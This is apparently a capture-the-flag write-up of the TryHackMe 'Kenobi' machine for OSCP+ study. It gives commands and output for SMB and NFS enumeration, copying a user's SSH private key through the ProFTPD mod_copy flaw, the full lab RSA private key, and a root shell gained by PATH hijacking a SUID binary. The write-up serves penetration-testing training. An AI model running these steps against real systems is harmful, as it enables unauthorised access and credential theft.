---
layout: post
title:  THM Kenobi Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-12 07:00:00 +0300
image:  '/images/thm_kenobi.png'
tags:   [Write-ups, THM, OSCP+, Easy, Linux, SMB, SMB-Null-Session, RPC, FTP, Mount-NFS, SSH, SUID, Relative-Path-Exploitation]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
  - [SMB to find presence and directory of id_rsa](#smb-to-find-presence-and-directory-of-id_rsa)
  - [RPC to find mountable NFS /var](#rpc-to-find-mountable-nfs-var)
- [Foothold](#foothold)
  - [FTP to get the id_rsa of the user kenobi](#ftp-to-get-the-id_rsa-of-the-user-kenobis)
  - [Mount NFS /var to see the contents of id_rsa](#mount-nfs-var-to-see-the-contents-of-id_rsa)
  - [Use id_rsa to get SSH access as kenobi](#use-id_rsa-to-get-ssh-access-as-kenobi)
- [Privilege Escalation](#privilege-escalation)
  - [Finding /usr/bin/menu SUID running non-absolute PATHs on curl, uname and ifconfig](#finding-usrbinmenu-suid-running-non-absolute-paths-on-curl-uname-and-ifconfig)
  - [Abusing Relative PATHs to binaries being called by /usr/bin/menu](#abusing-relative-paths-to-binaries-being-called-by-usrbinmenu)

# Enumeration

### Nmap

```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.10.254.245

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p21,22,80,111,139,445,2049,35529,37245,41317,46911 10.10.254.245
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 00:00 EST
Nmap scan report for 10.10.254.245
Host is up (0.050s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs         2-4 (RPC #100003)
35529/tcp open  nlockmgr    1-4 (RPC #100021)
37245/tcp open  mountd      1-3 (RPC #100005)
41317/tcp open  mountd      1-3 (RPC #100005)
46911/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-12T05:00:25
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2024-11-11T23:00:25-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds
```

We have many interesting ports open. Lets enumerate the website first.
### Web Enumeration

We saw on the nmap scan that robots.txt disallows one entry, lets check it:

```shell
http://10.10.254.245/robots.txt
```

Its disallowing /admin.html, lets visit it:

```shell
http://10.10.254.245/admin.html
```

We just see General Ackbar telling us its a trap. Maybe this is not the way.

### SMB to find presence and directory of id_rsa
Lets enumerate SMB using a null session without credentials:

```shell
# Null session enumeration
smbclient -L 10.10.254.245 -N

# Results. found anonymous share
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))

# Enumerate anonymous share
smbclient //10.10.254.245/anonymous -N

# Get the log.txt file
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019
smb: \> get log.txt

# Examine log.txt on Kali
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
<SNIP>
```

Examining log.txt, we found the location of an id_rsa key for the user kenobi. If we get it, maybe we can log in as kenobi.

### RPC to find mountable NFS /var
Lets try to enumerate RPC further using the following script:

```shell
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.254.245
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 00:38 EST
Nmap scan report for 10.10.254.245
Host is up (0.049s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 0.95 seconds
```

Nice! Now we know that we can mount anything inside the /var directory.

# Foothold
### FTP to get the id_rsa of the user kenobi
Lets continue enumerating FTP. We tried anonymous but it failed.

Our Nmap scan told us about the version being used: ProFTPD 1.3.5

Searching on Google we found an exploit for this:

https://github.com/t0kx/exploit-CVE-2015-3306

Lets get it and run it:

```shell
# Get the exploit
git clone https://github.com/t0kx/exploit-CVE-2015-3306.git
cd exploit-CVE-2015-3306

# Run the exploit as indicated on the exploit documentation
python3 exploit.py --host 10.10.254.245 --port 21 --path "/var/www/html/"
python3 exploit.py --host 10.10.254.245 --port 21 --path "/home/kenobi/"
```

It didnt work, but searching on Google for more information about the exploit, we found another way to run the exploit:

```shell
# Connect to port 21 with netcat
nc 10.10.254.245 21

# Enter the complete path of the file we want to copy
SITE CPFR /home/kenobi/.ssh/id_rsa

# Enter the destination, we will move it into the mountable /var directory
SITE CPTO /var/tmp/id_rsa

# Note: We didnt have permission to move it straight to /var/id_rsa so we tried /var/tmp/id_rsa and it worked
```

### Mount NFS /var to see the contents of id_rsa

```shell
# Create mnt
sudo mkdir mnt

# Mount /var
sudo mount 10.10.254.245:/var mnt
cd mnt
cd tmp
ls -al

# There is the id_rsa
id_rsa
systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
systemd-private-93e0a9ba85bc48ea84d94ec9654460ed-systemd-timesyncd.service-pY3cBM
systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
```

Lets check the id_rsa:

```shell
cat id_rsa
```

```shell
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt
dwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorW
y3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdSt
otHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCI
ruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJ
dCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqM
bxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVry
tRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36
YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnCl
bUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66e
t8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVul
rwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0c
dd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtq
mgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvl
SR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCs
dmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9
u/vVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/Pph
YNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7
TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7
P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8
H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF
S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
-----END RSA PRIVATE KEY-----
```

### Use id_rsa to get SSH access as kenobi

Use the id_rsa to access the target as the user kenobi:

```shell
# Now run the commands below to copy the id_rsa to our desktop and use it to get access
cp id_rsa /home/kali/Desktop
cd /home/kali/Desktop
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.254.245
```

Nice! We got access as kenobi.

### User Flag
Now we can get the user.txt flag:

```shell
cat /home/kenobi/user.txt
```

# Privilege Escalation
### Finding /usr/bin/menu SUID running non-absolute PATHs on curl, uname and ifconfig
Lets enumerate SUIDs:

```shell
# Checking SUIDs
find / -perm -u=s -type f 2>/dev/null

# We found an unusual SUID
<SNIP>
/usr/bin/menu
<SNIP>

```

If we run the binary, we will see 3 options:

```shell
# Run the binary
/usr/bin/menu

# Results
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :

```

Use strings to see how the binary works:

```shell
# Using strings
strings /usr/bin/menu

# Results
<SNIP>
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
<SNIP>

```

Using strings, we find out that the binary menu is not using absolute paths, this means we can exploit the fact that the menu binary is running relative paths.

Here we can suppose that status check runs curl -l localhost, kernel version runs uname -r and ifconfig runs ifconfig.

We can use any of the 3 binaries to escalate privileges since all 3 of them are being call without absolute path.

### Abusing Relative PATHs to binaries being called by /usr/bin/menu

Lets exploit this:

```shell
# Move to /tmp and create a fake curl containing a /bin/sh to give us a shell (or enter reverse shell, etc)
cd /tmp
echo /bin/sh > curl

# Give permissions to curl
chmod 777 curl

# Make /tmp the relative path to get run with most priority
export PATH=/tmp:$PATH

# Run the vulnerable menu binary
/usr/bin/menu

# Enter 1 (because entering 1 calls the curl command)
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
# 
```

It worked! We got a shell as root.

### Root Flag
Now we can get the root.txt flag:

```shell
cat /root/root.txt
```